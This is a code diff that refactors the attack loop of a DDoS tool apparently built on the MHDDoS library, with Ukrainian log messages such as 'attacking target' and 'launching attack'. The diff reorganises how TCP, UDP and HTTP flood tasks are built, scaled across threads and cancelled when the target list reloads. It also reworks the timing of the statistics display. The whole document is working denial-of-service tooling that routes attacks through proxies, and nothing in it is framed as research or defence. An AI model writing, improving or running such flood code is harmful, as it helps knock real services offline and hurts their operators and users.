@@ -18,12 +18,15 @@ from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood
 from src.output import show_statistic, print_banner
 from src.proxies import ProxySet
 from src.system import fix_ulimits, is_latest_version
-from src.targets import TargetsLoader
+from src.targets import Target, TargetsLoader
+
+
+AsyncFlood = Union[AsyncTcpFlood, AsyncUdpFlood]
 
 
 class FloodTask:
 
-    def __init__(self, runnable: Union[AsyncTcpFlood, AsyncUdpFlood], scale: int = 1):
+    def __init__(self, runnable: AsyncFlood, scale: int = 1):
         self._runnable = runnable
         self._scale = scale
         self._failure_budget = scale * FAILURE_BUDGET_FACTOR
@@ -67,7 +70,7 @@ async def run_ddos(
             logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
             exit()
 
-    def prepare_params(target, method):
+    def prepare_flooder(target: Target, method: str) -> AsyncFlood:
         thread_statistics = Stats()
         statistics[(target, method)] = thread_statistics
         kwargs = {
@@ -85,14 +88,14 @@ async def run_ddos(
                 f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                 % (target.url.host, target.url.port, method)
             )
-        return kwargs
+        return mhddos_main(**kwargs)
 
     logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
     if not (table or debug):
         # Keep the docs/info on-screen for some time before outputting the logger.info above
         await asyncio.sleep(5)
 
-    flooders = []
+    active_flooder_tasks = []
 
     async def load_targets():
         targets, changed = await targets_loader.load()
@@ -101,40 +104,43 @@ async def run_ddos(
 
     async def install_targets(targets):
         # cancel running flooders
-        if flooders:
-            for task in flooders:
+        if active_flooder_tasks:
+            for task in active_flooder_tasks:
                 task.cancel()
-            flooders.clear()
+            active_flooder_tasks.clear()
 
         statistics.clear()
 
-        kwargs_list = []
+        tcp_flooders, udp_flooders = [], []
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
             # udp://, method defaults to "UDP"
             if target.is_udp:
-                kwargs_list.append((prepare_params(target, target.method or 'UDP'), 0))
+                udp_flooders.append(prepare_flooder(target, target.method or 'UDP'))
             # Method is given explicitly
             elif target.method is not None:
-                kwargs_list.append((prepare_params(target, target.method), 1))
+                tcp_flooders.append(prepare_flooder(target, target.method))
             # tcp://
             elif target.url.scheme == "tcp":
-                kwargs_list.append((prepare_params(target, 'TCP'), 1))
+                tcp_flooders.append(prepare_flooder(target, 'TCP'))
             # HTTP(S), methods from --http-methods
             elif target.url.scheme in {"http", "https"}:
                 for method in http_methods:
-                    kwargs_list.append((prepare_params(target, method), 1))
+                    tcp_flooders.append(prepare_flooder(target, method))
             else:
                 logger.error(f"Unsupported scheme given: {target.url.scheme}")
 
-        num_tcp_flooders = sum(pair[1] for pair in kwargs_list)
-        scale = max(1, (total_threads // num_tcp_flooders) if num_tcp_flooders > 0 else 0)
+        num_tcp = len(tcp_flooders)
+        scale = max(1, (total_threads // num_tcp) if num_tcp > 0 else 0)
 
-        for kwargs, is_tcp in kwargs_list:
-            runnable = mhddos_main(**kwargs)
-            task = asyncio.create_task(FloodTask(runnable, scale if is_tcp else 1).loop())
+        for flooder in tcp_flooders:
+            task = asyncio.create_task(FloodTask(flooder, scale).loop())
             # XXX: add stats for running/cancelled tasks with add_done_callback
-            flooders.append(task)
+            active_flooder_tasks.append(task)
+        
+        for flooder in udp_flooders:
+            task = asyncio.create_task(FloodTask(flooder).loop())
+            active_flooder_tasks.append(task)
 
     try:
         initial_targets, _ = await load_targets()
@@ -150,12 +156,11 @@ async def run_ddos(
     tasks = []
 
     async def stats_printer():
-        ts = time.time()
+        cycle_start = time.perf_counter()
         while True:
             await asyncio.sleep(REFRESH_RATE)
             try:
-                passed = time.time() - ts
-                ts = time.time()
+                passed = time.perf_counter() - cycle_start
                 num_proxies = len(proxies)
                 show_statistic(
                     statistics,
@@ -165,11 +170,9 @@ async def run_ddos(
                     None if targets_loader.age is None else reload_after-int(targets_loader.age),
                     use_my_ip,
                 )
-            except:
-                ts = time.time()
+            finally:
+                cycle_start = time.perf_counter()
 
-    #cycle_start = time.perf_counter()
-    #    passed = time.perf_counter() - cycle_start
 
     # setup coroutine to print stats
     tasks.append(asyncio.ensure_future(stats_printer()))
